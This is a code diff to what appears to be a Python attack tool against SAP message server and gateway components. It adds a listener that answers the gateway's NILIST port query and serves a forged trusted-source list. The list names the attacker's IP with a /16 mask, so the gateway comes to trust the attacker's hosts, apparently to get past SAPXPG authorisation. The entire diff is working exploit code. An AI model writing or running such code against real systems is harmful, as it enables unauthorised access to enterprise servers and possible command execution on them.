@@ -35,6 +35,7 @@ import argparse
 import logging
 import socket
 import struct
+import threading
 import time
 import sys
 
@@ -437,6 +438,75 @@ def build_nilist_port_reply(fromname: str, key: bytes,
 
 
 # ---------------------------------------------------------------------------
+# Pull-model NILIST TCP listener
+# ---------------------------------------------------------------------------
+
+_NILIST_PORT = 4444   # TCP port we advertise in our AD_GET_NILIST_PORT reply
+
+
+def _start_nilist_listener(attacker_ip: str,
+                            port: int = _NILIST_PORT) -> int:
+    """Start a one-shot TCP listener for the pull-model NILIST.
+
+    When the GW receives our AD_GET_NILIST_PORT reply (port=N), it connects
+    to attacker_ip:N expecting us to serve an IP list.  We send a minimal
+    NI-framed NILIST containing attacker_ip with mask 0.0.255.255 so the GW
+    adds the full /16 host-range to its trusted sources.
+
+    Binds on 0.0.0.0 so the GW can reach us regardless of interface aliasing.
+
+    Returns the actual port bound (useful if port=0 was requested), or 0 on
+    failure.
+    """
+    srv = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+    try:
+        srv.bind(("0.0.0.0", port))
+    except OSError as e:
+        print(f"[!] NILIST listener: cannot bind 0.0.0.0:{port}: {e}")
+        srv.close()
+        return 0
+    srv.listen(1)
+    actual_port = srv.getsockname()[1]
+    print(f"[*] NILIST listener ready on 0.0.0.0:{actual_port} "
+          f"(waiting for GW to connect)")
+
+    def _serve():
+        srv.settimeout(60)   # GW should connect within 60 s of getting our reply
+        try:
+            conn, addr = srv.accept()
+            print(f"[+] GW connected to NILIST listener from {addr[0]}:{addr[1]}")
+            # Read any request data (GW may send a short NI request header)
+            conn.settimeout(2)
+            try:
+                conn.recv(256)
+            except (socket.timeout, OSError):
+                pass
+            # Send NI-framed NILIST: count(2BE) + [mask(4) + ip(4)]
+            # This is the minimal binary format that sapms/gwrd understands.
+            payload = struct.pack("!H", 1)                  # 1 entry
+            payload += socket.inet_aton("0.0.255.255")      # subnet mask
+            payload += socket.inet_aton(attacker_ip)        # our IP to trust
+            ni_frame = struct.pack("!I", len(payload)) + payload
+            conn.sendall(ni_frame)
+            conn.close()
+            print(f"[+] NILIST served to GW: {attacker_ip}/0.0.255.255")
+        except socket.timeout:
+            print("[!] NILIST listener: GW did not connect within 60s")
+        except Exception as e:
+            print(f"[!] NILIST listener error: {e}")
+        finally:
+            try:
+                srv.close()
+            except Exception:
+                pass
+
+    t = threading.Thread(target=_serve, daemon=True, name="nilist-listener")
+    t.start()
+    return actual_port
+
+
+# ---------------------------------------------------------------------------
 # Wait-and-reply loop for incoming NILIST requests
 # ---------------------------------------------------------------------------
 
@@ -506,13 +576,20 @@ def _wait_and_reply_nilist(sock: socket.socket, fromname: str, key: bytes,
 
             if first_opcode == ADM_GET_NILIST_PORT:
                 # Pull-model: MS asks "what port is your NILIST listener?"
-                # Replying with port=0 immediately unblocks the MS work process.
-                # Without this reply the MS DIA work process stays blocked (visible
-                # in SM66 as 'ADM opcode AD_GET_NILIST_PORT (Server msg_server)'),
-                # which prevents the GW from completing SAPXPG authorisation (P3).
-                print(f"[*] AD_GET_NILIST_PORT received — replying port=0 "
-                      f"(unblocking MS work process)")
-                reply = build_nilist_port_reply(fromname, key, nilist_port=0)
+                # Start a real TCP listener and give the GW the port number so
+                # it can connect and fetch our IP list.  port=0 ("no listener")
+                # prevents the GW from learning our IP and trusting it.
+                actual_p = _start_nilist_listener(attacker_ip, _NILIST_PORT)
+                if actual_p:
+                    time.sleep(0.05)
+                    print(f"[*] AD_GET_NILIST_PORT received — "
+                          f"replying port={actual_p} (NILIST listener ready)")
+                    reply = build_nilist_port_reply(fromname, key,
+                                                    nilist_port=actual_p)
+                else:
+                    print(f"[!] AD_GET_NILIST_PORT — NILIST listener failed, "
+                          f"replying port=0 (fallback)")
+                    reply = build_nilist_port_reply(fromname, key, nilist_port=0)
                 ni_send(sock, reply)
                 # Don't return — keep waiting; MS may follow with NILIST request
 
@@ -524,8 +601,15 @@ def _wait_and_reply_nilist(sock: socket.socket, fromname: str, key: bytes,
                 return True
             # Also handle AD_GET_NILIST_PORT sent as a REQUEST (some kernel variants)
             if opc.get("opcode") == ADM_GET_NILIST_PORT:
-                print(f"[*] AD_GET_NILIST_PORT (as REQUEST) — replying port=0")
-                reply = build_nilist_port_reply(fromname, key, nilist_port=0)
+                actual_p = _start_nilist_listener(attacker_ip, _NILIST_PORT)
+                if actual_p:
+                    time.sleep(0.05)
+                    print(f"[*] AD_GET_NILIST_PORT (REQUEST) — "
+                          f"replying port={actual_p}")
+                    reply = build_nilist_port_reply(fromname, key,
+                                                    nilist_port=actual_p)
+                else:
+                    reply = build_nilist_port_reply(fromname, key, nilist_port=0)
                 ni_send(sock, reply)
 
     return False
@@ -811,9 +895,24 @@ def betrusted(host: str, port: int, attacker_ip: str,
                                 result["nilist_response"] = True
                                 result["nilist_sent"] = True
                             elif opcode == ADM_GET_NILIST_PORT:
-                                print("[*] Hold: AD_GET_NILIST_PORT — replying port=0")
-                                ni_send(sock, build_nilist_port_reply(
-                                    our_name, key, nilist_port=0))
+                                # Start a real NILIST TCP listener so GW can
+                                # fetch our IP list.  Replying port=0 ("no
+                                # listener") prevents GW from adding our IP to
+                                # its trusted sources even if our DP blob was
+                                # accepted by the MS.
+                                actual_p = _start_nilist_listener(
+                                    attacker_ip, _NILIST_PORT)
+                                if actual_p:
+                                    time.sleep(0.05)  # give listener time to bind
+                                    print(f"[*] Hold: AD_GET_NILIST_PORT — "
+                                          f"replying port={actual_p}")
+                                    ni_send(sock, build_nilist_port_reply(
+                                        our_name, key, nilist_port=actual_p))
+                                else:
+                                    print("[!] Hold: NILIST listener failed — "
+                                          "replying port=0 (fallback)")
+                                    ni_send(sock, build_nilist_port_reply(
+                                        our_name, key, nilist_port=0))
                             else:
                                 print(f"[*] Hold: ADM opcode {opcode:#04x} (ignored)")
                         elif flag2 in (FLAG_REQUEST, FLAG_ONE_WAY):
@@ -826,9 +925,17 @@ def betrusted(host: str, port: int, attacker_ip: str,
                                 result["nilist_response"] = True
                                 result["nilist_sent"] = True
                             elif opc_val == ADM_GET_NILIST_PORT:
-                                print("[*] Hold: AD_GET_NILIST_PORT (REQUEST) — replying port=0")
-                                ni_send(sock, build_nilist_port_reply(
-                                    our_name, key, nilist_port=0))
+                                actual_p = _start_nilist_listener(
+                                    attacker_ip, _NILIST_PORT)
+                                if actual_p:
+                                    time.sleep(0.05)
+                                    ni_send(sock, build_nilist_port_reply(
+                                        our_name, key, nilist_port=actual_p))
+                                    print(f"[*] Hold: AD_GET_NILIST_PORT (REQ) "
+                                          f"— replying port={actual_p}")
+                                else:
+                                    ni_send(sock, build_nilist_port_reply(
+                                        our_name, key, nilist_port=0))
                     except (ConnectionError, OSError):
                         break
             print(f"[*] Stop signal received — disconnecting from MS")
